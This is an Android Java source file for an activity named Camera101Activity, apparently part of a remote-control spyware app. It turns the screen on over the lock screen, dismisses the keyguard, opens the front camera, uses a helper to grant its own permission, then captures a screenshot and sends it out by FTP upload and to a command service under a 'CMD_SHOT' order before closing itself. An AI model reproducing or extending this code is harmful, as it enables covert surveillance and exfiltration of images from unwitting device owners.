package activity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.RelativeLayout;

import download.ftp;
import order.order;
import order.Order101Service;
import order.screen.ScreenShot101Activity;
import order.screen.Shotter;
import permission.GivePermission;
import utils.ConfigCt;
import utils.Funcs;

@SuppressWarnings("deprecation")
public class Camera101Activity extends Activity implements SurfaceHolder.Callback {
	private SurfaceView surfaceView;
	private int cameraCount = 0;
	private Camera cam = null;
	private SurfaceHolder holder;
	public static Camera101Activity mCameraActivity;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
				| WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
				| WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
				| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		//setContentView(R.layout.activity_camera);
		//surfaceView = (SurfaceView) findViewById(R.id.surface);
		int LinearLayoutID=utils.ResourceUtil.getLayoutId(getApplicationContext(), "activity_camera");
		LayoutInflater mlayoutInflater = LayoutInflater.from(getApplicationContext());
		View view = mlayoutInflater.inflate(LinearLayoutID, null);
		RelativeLayout.LayoutParams relLayoutParams=new RelativeLayout.LayoutParams
				(RelativeLayout.LayoutParams.MATCH_PARENT,RelativeLayout.LayoutParams.MATCH_PARENT);
		this.addContentView(view,relLayoutParams);
		//setContentView(LinearLayoutID);
		surfaceView = (SurfaceView) view.findViewById(utils.ResourceUtil.getId(this, "surface"));
		mCameraActivity=this;
		if(ConfigCt.getInstance(this).haveCameraPermission())
			Carmera();
		else{
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				this.finish();
				return;
			}
			processCarmera();
			ConfigCt.getInstance(this).setCameraPermission(true);
		}

	}
	@Override
	protected void onResume() {
		super.onResume();
		//processCarmera();
	}
	/*
	 * 相机
	 */
	public  void Carmera(){
		try{
			holder = surfaceView.getHolder();
			holder.addCallback(Camera101Activity.this);  //设置回调
			Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
			cameraCount = Camera.getNumberOfCameras(); // get cameras number

			for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {
				Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo
				if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // 代表摄像头的方位，目前有定义值两个分别为CAMERA_FACING_FRONT前置和CAMERA_FACING_BACK后置
					try {
						cam = Camera.open( camIdx );

					} catch (RuntimeException e) {
						e.printStackTrace();
					}
				}
			}
		}catch(ActivityNotFoundException e)
		{
			e.printStackTrace();
			//return false;
		}
	}
	/*
	 * 相机
	 */
	public  void processCarmera(){
		new Thread(new Runnable() {
			@Override
			public void run() {
				//Looper.prepare();
				try{
					holder = surfaceView.getHolder();
					holder.addCallback(Camera101Activity.this);  //设置回调
					Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
					cameraCount = Camera.getNumberOfCameras(); // get cameras number

					for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {
						Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo
						if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // 代表摄像头的方位，目前有定义值两个分别为CAMERA_FACING_FRONT前置和CAMERA_FACING_BACK后置
							try {
								cam = Camera.open( camIdx );

							} catch (RuntimeException e) {
								e.printStackTrace();
							}
						}
					}
				}catch(ActivityNotFoundException e)
				{
					e.printStackTrace();
					//return false;
				}
				//Looper.loop();
				Camera101Activity.this.finish();
			}
		}).start();
	}
	@Override
	public void surfaceCreated(SurfaceHolder holder) {
		if(cam==null)return;
		try {
			//cam.
			cam.setPreviewDisplay(holder);
		} catch (IOException e) {
			e.printStackTrace();
		}
		cam.startPreview();
		//sendMyPic();
		sendPic();
	}
	@Override
	public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {

	}

	@Override
	public void surfaceDestroyed(SurfaceHolder holder) {

	}
	@Override
	protected void onDestroy() {
		if(cam!=null){
			cam.lock();
			cam.stopPreview();//停掉原来摄像头的预览
			cam.release();//释放资源
			cam=null;
		}
		super.onDestroy();
	}
	private void sendPic(){
		if(ScreenShot101Activity.shotter==null)return;
		final String filename=Funcs.getFilename(ConfigCt.appID, ".jpg");
		ScreenShot101Activity.shotter.startScreenShot(new Shotter.OnShotListener() {
			@Override
			public void onFinish(Bitmap bitmap) {
				ftp.getFtp(Camera101Activity.this).UploadStart(filename);
				Order101Service.getOrder101Service().SendBmp(order.CMD_SHOT,bitmap);
				Camera101Activity.this.finish();
			}
		},ConfigCt.LocalPath+filename,80);
	}
	private void sendMyPic(){
		View dView = getWindow().getDecorView();
		dView.setDrawingCacheEnabled(true);
		dView.buildDrawingCache();
		Bitmap bitmap = Bitmap.createBitmap(dView.getDrawingCache());
		if (bitmap != null) {
			try {
				Order101Service.getOrder101Service().SendBmp(order.CMD_SHOT,bitmap);
				String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".jpg");
				File file = new File(filename);
				file.createNewFile();
				FileOutputStream os = new FileOutputStream(file);
				bitmap.compress(Bitmap.CompressFormat.PNG, 100, os);
				os.flush();
				os.close();
				ftp.getFtp(Camera101Activity.this).UploadStart(filename);
				Camera101Activity.this.finish();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	/*
	 * root模块初始化：
	 */
	private void CameraPrepare(){
		Handler handler= new Handler();
		Runnable runnableRoot  = new Runnable() {
			@Override
			public void run() {
				processCarmera();
			}
		};
		handler.postDelayed(runnableRoot, 1000*4);
	}
}
